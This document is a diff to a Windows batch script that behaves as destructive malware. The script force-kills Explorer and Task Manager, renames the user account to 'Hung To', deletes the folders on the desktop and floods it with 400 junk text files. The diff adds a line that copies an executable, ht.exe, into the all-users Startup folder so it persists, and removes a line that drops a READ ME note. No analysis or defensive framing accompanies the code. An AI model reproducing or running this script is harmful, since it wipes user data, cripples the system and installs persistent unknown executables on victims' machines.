@@ -2,6 +2,7 @@
 taskkill /f /im explorer.exe
 taskkill /f /im taskmgr.exe
 copy %temp%\one.rtf "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\one.rtf"
+copy %temp%\ht.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ht.exe"
 wmic useraccount where name='%username%' set FullName='Hung To'
 wmic useraccount where name='%username%' rename 'Hung To'
 SET /a cr=0
@@ -11,7 +12,6 @@ for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"
 :l
 copy %temp%\text.txt "%userprofile%\Desktop\Hung To Hung To Hung To Hung To Hung To Hung To Hung To %cr%X.txt"
 SET /a cr=%cr%+1
-if %cr%==1 copy %temp%\one.rtf %userprofile%\Desktop\READ ME.rtf
 if not %cr%==400 goto l
 
 
